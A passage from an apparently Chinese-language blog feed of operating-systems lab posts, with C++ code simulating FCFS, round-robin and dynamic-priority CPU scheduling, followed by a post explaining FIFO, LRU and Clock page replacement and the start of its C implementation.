b.priority;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a.arrive_time &lt; b.arrive_time;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//选择进程调度策略</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">select_policy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n请选择调度算法(输入、、选择)：\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1.先来先服务调度(FCFS)              \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2.时间片轮转调度(Round-Robin)       \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3.动态优先级调度(DynamicPriority)   \n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入调度算法序号:&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;n)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (n &gt; <span class="number">3</span> || n &lt; <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;对不起,输入有误,请重新输入!\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输入进程信息</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">input_process</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> num;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入进程数量:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">	PCB	pro;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= num; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n请输入第%d个进程的到达时间、服务时间及优先级（以空格隔开）:\n&quot;</span>, i);</span><br><span class="line">		<span class="built_in">scanf_s</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;pro.arrive_time, &amp;pro.service_time, &amp;pro.priority);</span><br><span class="line">		pro.ID = i;</span><br><span class="line">		pro.all_time = pro.service_time;</span><br><span class="line">		pro.cpu_time = <span class="number">0</span>;</span><br><span class="line">		pro.start_time = <span class="number">-1</span>;<span class="comment">//开始时间、结束时间默认为-1，表示尚未被调度过</span></span><br><span class="line">		pro.end_time = <span class="number">-1</span>;</span><br><span class="line">		pro.state = <span class="string">&quot;Unarrive&quot;</span>;<span class="comment">//初始化为尚未进入到达</span></span><br><span class="line">		arrive_queue.<span class="built_in">push_back</span>(pro);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//按照到达时间升序排队</span></span><br><span class="line">	<span class="built_in">sort</span>(arrive_queue.<span class="built_in">begin</span>(), arrive_queue.<span class="built_in">end</span>(), cmp_arrive_time);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印单个进程的信息</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_process</span><span class="params">(PCB* pro)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (pro == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%4d%10d%10d%8d%10s&quot;</span>, pro-&gt;ID, pro-&gt;arrive_time, pro-&gt;service_time, pro-&gt;priority, pro-&gt;state);</span><br><span class="line">	<span class="keyword">if</span> (pro-&gt;start_time == <span class="number">-1</span>) &#123;<span class="comment">//开始时间，结束时间，剩余时间</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%10s%10s%10s&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;--&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (pro-&gt;end_time == <span class="number">-1</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%10d%10s%10d&quot;</span>, pro-&gt;start_time, <span class="string">&quot;--&quot;</span>, pro-&gt;all_time);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%10d%10d%10d&quot;</span>, pro-&gt;start_time, pro-&gt;end_time, pro-&gt;all_time);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (pro-&gt;state == <span class="string">&quot;Finish&quot;</span>)<span class="comment">//周转时间及带权周转时间</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%10d%10.2lf\n&quot;</span>, pro-&gt;end_time - pro-&gt;arrive_time, (<span class="type">float</span>)(pro-&gt;end_time - pro-&gt;arrive_time) / (<span class="type">float</span>)pro-&gt;service_time);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%10s%10s\n&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;--&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印所有进程的信息</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_all</span><span class="params">(<span class="type">int</span> current)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (current == <span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n进程初始状态：\n&quot;</span>, current);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n当前时刻为：%d\n&quot;</span>, current);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;进程号 到达时间 服务时间 优先级   状态   开始时间 结束时间 剩余时间 周转时间 带权周转时间\n&quot;</span>);</span><br><span class="line">	<span class="comment">//首先打印正在运行的进程</span></span><br><span class="line">	<span class="keyword">if</span> (running_process != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">print_process</span>(running_process);</span><br><span class="line">	&#125;</span><br><span class="line">	vector&lt;PCB&gt;::iterator it;</span><br><span class="line">	<span class="comment">//然后打印就绪队列中的进程</span></span><br><span class="line">	<span class="keyword">for</span> (it = ready_queue.<span class="built_in">begin</span>(); it != ready_queue.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		<span class="built_in">print_process</span>(&amp;(*it));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//然后打印完成队列中的进程</span></span><br><span class="line">	<span class="keyword">for</span> (it = finish_queue.<span class="built_in">begin</span>(); it != finish_queue.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		<span class="built_in">print_process</span>(&amp;(*it));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//然后打印仍然在到达队列中的进程</span></span><br><span class="line">	<span class="keyword">for</span> (it = arrive_queue.<span class="built_in">begin</span>(); it != arrive_queue.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		<span class="built_in">print_process</span>(&amp;(*it));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//先来先服务算法</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">FCFS</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> chip = <span class="number">0</span>;<span class="comment">//初始的时间片为0</span></span><br><span class="line">	<span class="type">bool</span> need_schedule = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//如果到达队列和就绪队列都为空，则所有进程完成</span></span><br><span class="line">		<span class="keyword">if</span> (!running_process &amp;&amp; arrive_queue.<span class="built_in">empty</span>() &amp;&amp; ready_queue.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//将到达队列中，到达时间为当前时间片的进程放入就绪队列中，并从到达队列中删除</span></span><br><span class="line">		<span class="keyword">while</span> (!arrive_queue.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">			PCB pro = arrive_queue[<span class="number">0</span>];</span><br><span class="line">			<span class="keyword">if</span> (pro.arrive_time &lt;= chip) &#123;</span><br><span class="line">				pro.state = <span class="string">&quot;Ready&quot;</span>;</span><br><span class="line">				ready_queue.<span class="built_in">push_back</span>(pro);</span><br><span class="line">				arrive_queue.<span class="built_in">erase</span>(arrive_queue.<span class="built_in">begin</span>() + <span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//判断是否需要调度，如需要就从就绪队列中拿出一个进行调度</span></span><br><span class="line">		<span class="keyword">if</span> (need_schedule &amp;&amp; !ready_queue.<span class="built_in">empty</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			running_process = <span class="keyword">new</span> PCB;</span><br><span class="line">			*running_process = ready_queue[<span class="number">0</span>];<span class="comment">//从就绪队首中取出一个</span></span><br><span class="line">			ready_queue.<span class="built_in">erase</span>(ready_queue.<span class="built_in">begin</span>() + <span class="number">0</span>);<span class="comment">//从就绪队列中删除之</span></span><br><span class="line">			<span class="comment">//调度一个程序开始运行</span></span><br><span class="line">			running_process-&gt;start_time = chip;</span><br><span class="line">			running_process-&gt;state = <span class="string">&quot;Executing&quot;</span>;</span><br><span class="line">			need_schedule = <span class="literal">false</span>;</span><br><span class="line">			<span class="built_in">print_all</span>(chip);<span class="comment">//打印当前所有进程的信息</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//FCFS当前任务运行到结束，才可能调度下一个任务</span></span><br><span class="line">		<span class="keyword">if</span> (running_process) &#123;</span><br><span class="line">			running_process-&gt;end_time = running_process-&gt;start_time + running_process-&gt;service_time;</span><br><span class="line">			running_process-&gt;state = <span class="string">&quot;Finish&quot;</span>;</span><br><span class="line">			running_process-&gt;cpu_time = running_process-&gt;service_time;</span><br><span class="line">			running_process-&gt;all_time = <span class="number">0</span>;</span><br><span class="line">			chip += running_process-&gt;service_time;</span><br><span class="line">			finish_queue.<span class="built_in">push_back</span>(*running_process);<span class="comment">//将完成任务放入完成队列中</span></span><br><span class="line">			<span class="keyword">delete</span> running_process;</span><br><span class="line">			running_process = <span class="literal">NULL</span>;</span><br><span class="line">			need_schedule = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			chip += <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//所有任务全部完成后，打印一次</span></span><br><span class="line">	<span class="built_in">print_all</span>(chip);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//时间片轮转算法</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">round_robin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> chip = <span class="number">0</span>;<span class="comment">//初始的时间片为0</span></span><br><span class="line">	<span class="type">bool</span> need_schedule = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//如果到达队列和就绪队列都为空，则所有进程完成</span></span><br><span class="line">		<span class="keyword">if</span> (!running_process &amp;&amp; arrive_queue.<span class="built_in">empty</span>() &amp;&amp; ready_queue.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//将到达队列中，到达时间为当前时间片的进程放入就绪队列中，并从到达队列中删除</span></span><br><span class="line">		<span class="keyword">while</span> (!arrive_queue.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">			PCB pro = arrive_queue[<span class="number">0</span>];</span><br><span class="line">			<span class="keyword">if</span> (pro.arrive_time &lt;= chip) &#123;</span><br><span class="line">				pro.state = <span class="string">&quot;Ready&quot;</span>;</span><br><span class="line">				ready_queue.<span class="built_in">push_back</span>(pro);</span><br><span class="line">				arrive_queue.<span class="built_in">erase</span>(arrive_queue.<span class="built_in">begin</span>() + <span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//判断是否需要调度，如需要就从就绪队列中拿出一个进行调度</span></span><br><span class="line">		<span class="keyword">if</span> (need_schedule &amp;&amp; !ready_queue.<span class="built_in">empty</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			running_process = <span class="keyword">new</span> PCB;</span><br><span class="line">			*running_process = ready_queue[<span class="number">0</span>];<span class="comment">//从就绪队首中取出一个</span></span><br><span class="line">			ready_queue.<span class="built_in">erase</span>(ready_queue.<span class="built_in">begin</span>() + <span class="number">0</span>);<span class="comment">//从就绪队列中删除之</span></span><br><span class="line">			<span class="comment">//调度一个程序开始运行</span></span><br><span class="line">			<span class="keyword">if</span> (running_process-&gt;start_time == <span class="number">-1</span>) &#123;<span class="comment">//首次运行</span></span><br><span class="line">				running_process-&gt;start_time = chip;</span><br><span class="line">			&#125;</span><br><span class="line">			running_process-&gt;state = <span class="string">&quot;Executing&quot;</span>;</span><br><span class="line">			need_schedule = <span class="literal">false</span>;</span><br><span class="line">			<span class="built_in">print_all</span>(chip);<span class="comment">//打印当前所有进程的信息</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//当前运行任务完成个时间片，判断该任务是否已经完成</span></span><br><span class="line">		<span class="keyword">if</span> (running_process) &#123;</span><br><span class="line">			running_process-&gt;cpu_time += <span class="number">1</span>;</span><br><span class="line">			running_process-&gt;all_time -= <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">if</span> (running_process-&gt;all_time == <span class="number">0</span>) &#123;<span class="comment">//任务运行结束</span></span><br><span class="line">				running_process-&gt;end_time = chip + <span class="number">1</span>;</span><br><span class="line">				running_process-&gt;state = <span class="string">&quot;Finish&quot;</span>;</span><br><span class="line">				finish_queue.<span class="built_in">push_back</span>(*running_process);<span class="comment">//将其放入完成队列中</span></span><br><span class="line">				<span class="keyword">delete</span> running_process;</span><br><span class="line">				running_process = <span class="literal">NULL</span>;</span><br><span class="line">				need_schedule = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;<span class="comment">//任务没有完成，如果就绪队列中仍有任务，则轮转调度，否则不调度（这里是一种调度的优化，避免重新调度开销）</span></span><br><span class="line">				<span class="keyword">if</span> (!ready_queue.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">					running_process-&gt;state = <span class="string">&quot;Ready&quot;</span>;</span><br><span class="line">					ready_queue.<span class="built_in">push_back</span>(*running_process);<span class="comment">//将其放回就绪队列中</span></span><br><span class="line">					<span class="keyword">delete</span> running_process;</span><br><span class="line">					running_process = <span class="literal">NULL</span>;</span><br><span class="line">					need_schedule = <span class="literal">true</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					need_schedule = <span class="literal">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		chip += <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//所有任务全部完成后，打印一次</span></span><br><span class="line">	<span class="built_in">print_all</span>(chip);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//动态优先级算法</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dynamic_prio</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> chip = <span class="number">0</span>;<span class="comment">//初始的时间片为0</span></span><br><span class="line">	<span class="type">bool</span> need_schedule = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//如果到达队列和就绪队列都为空，则所有进程完成</span></span><br><span class="line">		<span class="keyword">if</span> (!running_process &amp;&amp; arrive_queue.<span class="built_in">empty</span>() &amp;&amp; ready_queue.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//将到达队列中，到达时间为当前时间片的进程放入就绪队列中，并从到达队列中删除</span></span><br><span class="line">		<span class="keyword">while</span> (!arrive_queue.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">			PCB pro = arrive_queue[<span class="number">0</span>];</span><br><span class="line">			<span class="keyword">if</span> (pro.arrive_time &lt;= chip) &#123;</span><br><span class="line">				pro.state = <span class="string">&quot;Ready&quot;</span>;</span><br><span class="line">				ready_queue.<span class="built_in">push_back</span>(pro);</span><br><span class="line">				arrive_queue.<span class="built_in">erase</span>(arrive_queue.<span class="built_in">begin</span>() + <span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!ready_queue.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">			<span class="comment">//将就绪进程按照优先级降序排列</span></span><br><span class="line">			<span class="built_in">sort</span>(ready_queue.<span class="built_in">begin</span>(), ready_queue.<span class="built_in">end</span>(), cmp_priority);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//判断是否需要调度，如需要就从就绪队列中拿出一个进行调度</span></span><br><span class="line">		<span class="keyword">if</span> (need_schedule &amp;&amp; !ready_queue.<span class="built_in">empty</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			running_process = <span class="keyword">new</span> PCB;</span><br><span class="line">			*running_process = ready_queue[<span class="number">0</span>];<span class="comment">//从就绪队首中取出一个</span></span><br><span class="line">			ready_queue.<span class="built_in">erase</span>(ready_queue.<span class="built_in">begin</span>() + <span class="number">0</span>);<span class="comment">//从就绪队列中删除之</span></span><br><span class="line">			<span class="comment">//调度一个程序开始运行</span></span><br><span class="line">			<span class="keyword">if</span> (running_process-&gt;start_time == <span class="number">-1</span>) &#123;<span class="comment">//首次运行</span></span><br><span class="line">				running_process-&gt;start_time = chip;</span><br><span class="line">			&#125;</span><br><span class="line">			running_process-&gt;state = <span class="string">&quot;Executing&quot;</span>;</span><br><span class="line">			need_schedule = <span class="literal">false</span>;</span><br><span class="line">			<span class="built_in">print_all</span>(chip);<span class="comment">//打印当前所有进程的信息</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//当前运行任务完成个时间片，判断该任务是否已经完成</span></span><br><span class="line">		<span class="keyword">if</span> (running_process) &#123;</span><br><span class="line">			running_process-&gt;cpu_time += <span class="number">1</span>;</span><br><span class="line">			running_process-&gt;all_time -= <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">if</span> (running_process-&gt;all_time == <span class="number">0</span>) &#123;<span class="comment">//任务运行结束</span></span><br><span class="line">				running_process-&gt;end_time = chip + <span class="number">1</span>;</span><br><span class="line">				running_process-&gt;state = <span class="string">&quot;Finish&quot;</span>;</span><br><span class="line">				finish_queue.<span class="built_in">push_back</span>(*running_process);<span class="comment">//将其放入完成队列中</span></span><br><span class="line">				<span class="keyword">delete</span> running_process;</span><br><span class="line">				running_process = <span class="literal">NULL</span>;</span><br><span class="line">				need_schedule = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;<span class="comment">//任务没有完成，如果就绪队列中仍有任务，且优先级大于或等于本任务的优先级，则轮转调度，否则不调度</span></span><br><span class="line">				<span class="keyword">if</span> (running_process-&gt;priority &gt; <span class="number">1</span>) &#123;</span><br><span class="line">					running_process-&gt;priority -= <span class="number">1</span>;<span class="comment">//优先级最小为1</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (!ready_queue.<span class="built_in">empty</span>() &amp;&amp; ready_queue[<span class="number">0</span>].priority &gt;= running_process-&gt;priority) &#123;</span><br><span class="line">					running_process-&gt;state = <span class="string">&quot;Ready&quot;</span>;</span><br><span class="line">					ready_queue.<span class="built_in">push_back</span>(*running_process);<span class="comment">//将其放回就绪队列中</span></span><br><span class="line">					<span class="keyword">delete</span> running_process;</span><br><span class="line">					running_process = <span class="literal">NULL</span>;</span><br><span class="line">					need_schedule = <span class="literal">true</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					need_schedule = <span class="literal">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		chip += <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//所有任务全部完成后，打印一次</span></span><br><span class="line">	<span class="built_in">print_all</span>(chip);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="实验结果："><a href="#实验结果：" class="headerlink" title="实验结果："></a>实验结果：</h3><img src="https://gitee.com/kingwempity/images/raw/master/images/process.png" alt="process" style="zoom:50%;">
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>C++</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>页面置换算法的实现</title>
    <url>/2024/11/17/%E9%A1%B5%E9%9D%A2%E7%BD%AE%E6%8D%A2%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="页面置换算法"><a href="#页面置换算法" class="headerlink" title="页面置换算法"></a>页面置换算法</h2><blockquote>
<p>实验说明：</p>
<p>通过页面置换算法模拟设计，理解虚拟存储技术的特点，掌握请求页式存储管理方式。</p>
<p>编程实现先进先出（FIFO）页面置换算法、最近最久未使用（LRU）页面置换算法、Clock(NRU)置换算法。</p>
</blockquote>
<h3 id="先进先出-FIFO-页面置换算法"><a href="#先进先出-FIFO-页面置换算法" class="headerlink" title="先进先出(FIFO)页面置换算法"></a>先进先出(FIFO)页面置换算法</h3><blockquote>
<p>​		先进先出（FIFO）页面置换算法基于队列的思想，认为最先进入内存的页面在后续被置换出去的可能性最大。该算法维护一个页面队列，新页面进入时添加到队列末尾，当需要置换页面时，选择队列头部的页面进行置换，就如同排队时先到的人先离开队伍一样。</p>
</blockquote>
<p><strong>算法流程图</strong>：</p>
<img src="https://gitee.com/kingwempity/images/raw/master/images/FIFO算法流程图.png" alt="FIFO算法流程图" style="zoom:50%;">

<h3 id="最近最久未使用-LRU-页面置换算法"><a href="#最近最久未使用-LRU-页面置换算法" class="headerlink" title="最近最久未使用(LRU)页面置换算法"></a>最近最久未使用(LRU)页面置换算法</h3><blockquote>
<p>​		最近最久未使用（LRU）页面置换算法基于这样一个原理：如果页面在过去很长一段时间内未被访问，那么在将来它被访问的可能性也比较小，所以当发生缺页中断且内存已满时，置换掉最近最久未使用的页面。</p>
</blockquote>
<p><strong>算法流程图</strong></p>
<img src="https://gitee.com/kingwempity/images/raw/master/images/LRU算法流程图.png" alt="LRU算法流程图" style="zoom:50%;">

<h3 id="最近未使用-NRU-页面置换算法"><a href="#最近未使用-NRU-页面置换算法" class="headerlink" title="最近未使用(NRU)页面置换算法"></a>最近未使用(NRU)页面置换算法</h3><blockquote>
<p>​		Clock 置换算法（也称为最近未用算法，NRU）是一种改进型的页面置换算法，它结合了先进先出（FIFO）算法和最近最久未使用（LRU）算法的部分思想。</p>
<p>​		该算法将内存中的页面构成一个环形链表（逻辑上的环形结构，可以通过数组配合指针来模拟实现），并为每个页面设置一个访问位（通常初始化为 0）。当有页面被访问时，将其访问位设置为 1。</p>
<p>​		在需要进行页面置换时，从当前指针位置开始扫描环形链表，查找访问位为 0 的页面（即最近未被使用的页面），如果找到这样的页面，就将其置换出去；如果扫描一圈都没有找到访问位为 0 的页面，那就将所有页面的访问位重新置为 0，然后再进行下一轮扫描，直到找到可置换的页面为止。这种方式类似于时钟指针的转动来依次查看各个页面的情况，所以被称为 Clock 置换算法。</p>
</blockquote>
<p><strong>算法流程图</strong></p>
<img src="https://gitee.com/kingwempity/images/raw/master/images/NRU算法流程图.png" alt="NRU算法流程图" style="zoom: 45%;">

<h3 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> overflow -2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> codenum 220 <span class="comment">// 指令数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pagenum 20  <span class="comment">// 页数</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n = pagenum, m = <span class="number">3</span>; <span class="comment">// n为页流数, m为物理块数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125; qnode, * qlink;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">(<span class="type">int</span>* str)</span>;</span><br><span class="line"><span class="type">int</span>* <span class="title function_">creatstr</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span>** <span class="title function_">initstring</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printresult</span><span class="params">(<span class="type">int</span>** a, <span class="type">int</span>* str)</span>;</span><br><span class="line">qlink <span class="title function_">initlink</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">release_link</span><span class="params">(qlink l)</span>; <span class="comment">// 释放链表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">fifo</span><span class="params">(<span class="type">int</span>* str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">lru</span><span class="params">(<span class="type">int</span>* str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">nru</span><span class="params">(<span class="type">int</span>* str)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随机生成页流</span></span><br><span class="line"><span class="type">int</span>* <span class="title function_">creatstr</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span>* str;</span><br><span class="line">    <span class="type">time_t</span> t;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    str = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * (pagenum + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (!str)</span><br><span class="line">        <span class="built_in">exit</span>(overflow);</span><br><span class="line">    srand((<span class="type">unsigned</span>)time(&amp;t));</span><br><span class="line">    <span class="keyword">for</span> (count = <span class="number">1</span>; count &lt;= pagenum; count++) &#123;</span><br><span class="line">        str[count] = rand() % (codenum / <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化二维数组</span></span><br><span class="line"><span class="type">int</span>** <span class="title function_">initstring</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span>** a = (<span class="type">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*) * (n + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (!a)</span><br><span class="line">        <span class="built_in">exit</span>(overflow);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        a[i] = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * (m + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">if</span> (!a[i])</span><br><span class="line">            <span class="built_in">exit</span>(overflow);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++)</span><br><span class="line">            